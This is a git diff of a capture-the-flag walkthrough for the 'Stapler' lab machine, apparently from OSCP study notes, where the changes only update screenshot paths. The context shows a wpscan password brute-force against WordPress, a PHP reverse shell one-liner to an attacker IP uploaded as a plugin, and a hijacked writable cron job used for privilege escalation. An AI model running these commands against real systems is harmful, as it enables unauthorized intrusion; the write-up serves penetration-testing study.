@@ -195,17 +195,17 @@ OS and Service detection performed. Please report any incorrect results at https
 
 After a lot of searching, I find that 12380 port is also running https service.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_21h17m23s_001.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Stapler/Stapler_2022.02.24_21h17m23s_001.png)
 
 We find the robots.txt file through ferooxbuster.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_21h20m17s_002.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Stapler/Stapler_2022.02.24_21h20m17s_002.png)
 
 Browsing to the ```https://192.168.172.148:12380/blogblog/``` we find in robots.txt. The website is built using WordPress.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_21h20m42s_003.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Stapler/Stapler_2022.02.24_21h20m42s_003.png)
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_21h20m58s_004.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Stapler/Stapler_2022.02.24_21h20m58s_004.png)
 
 I notice that the name of the commenter ```john``` is similar to the note file downloaded from ftp, so I try to use brute-force attack to get the WordPress login password.
 
@@ -213,13 +213,13 @@ I notice that the name of the commenter ```john``` is similar to the note file d
 wpscan --url https://192.168.172.148:12380/blogblog/ --passwords ~/Documents/rockyou.txt --max-threads 50 --usernames john --disable-tls-checks
 ```
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_21h21m18s_005.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Stapler/Stapler_2022.02.24_21h21m18s_005.png)
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_21h22m48s_006.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Stapler/Stapler_2022.02.24_21h22m48s_006.png)
 
 We confirm that the username is ```john``` and the password is ```incorrect```.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_22h10m34s_007.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Stapler/Stapler_2022.02.24_22h10m34s_007.png)
 
 Logging in to WordPress admin interface. I find out that we have permission to upload plugin files.
 
@@ -229,48 +229,48 @@ Creating a reverse shell php file.
 echo '<?php exec("/bin/bash -c '\''bash -i >& /dev/tcp/192.168.49.172/80 0>&1'\''");?>' > shell.php
 ```
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_22h11m11s_008.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Stapler/Stapler_2022.02.24_22h11m11s_008.png)
 
 Uploading shell.php file to server. 
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_22h15m35s_009.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Stapler/Stapler_2022.02.24_22h15m35s_009.png)
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_22h15m57s_010.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Stapler/Stapler_2022.02.24_22h15m57s_010.png)
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_22h16m40s_011.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Stapler/Stapler_2022.02.24_22h16m40s_011.png)
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_22h17m41s_012.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Stapler/Stapler_2022.02.24_22h17m41s_012.png)
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_22h18m12s_013.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Stapler/Stapler_2022.02.24_22h18m12s_013.png)
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_22h33m26s_014.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Stapler/Stapler_2022.02.24_22h33m26s_014.png)
 
 Starting a listener on port 80 and then browse to to plugin url ```https://192.168.172.148:12380/blogblog/wp-content/uploads/shell.php```.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_22h33m55s_015.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Stapler/Stapler_2022.02.24_22h33m55s_015.png)
 
 We get the shell.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_22h35m47s_016.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Stapler/Stapler_2022.02.24_22h35m47s_016.png)
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_22h36m5s_017.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Stapler/Stapler_2022.02.24_22h36m5s_017.png)
 
 #### Privilege Escalation
 
 We find a cron job with inappropriate permission settings in the execution of linpeas.sh results.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_23h42m16s_018.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Stapler/Stapler_2022.02.24_23h42m16s_018.png)
 
 We have the permission to modify the job file.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_23h45m19s_019.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Stapler/Stapler_2022.02.24_23h45m19s_019.png)
 
 Creating the file with reverse shell command and replcae the original job.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_23h46m49s_020.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Stapler/Stapler_2022.02.24_23h46m49s_020.png)
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_23h52m50s_021.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Stapler/Stapler_2022.02.24_23h52m50s_021.png)
 
 Starting a listener on port 80 and wait for minutes.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_23h53m3s_022.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Stapler/Stapler_2022.02.24_23h53m3s_022.png)
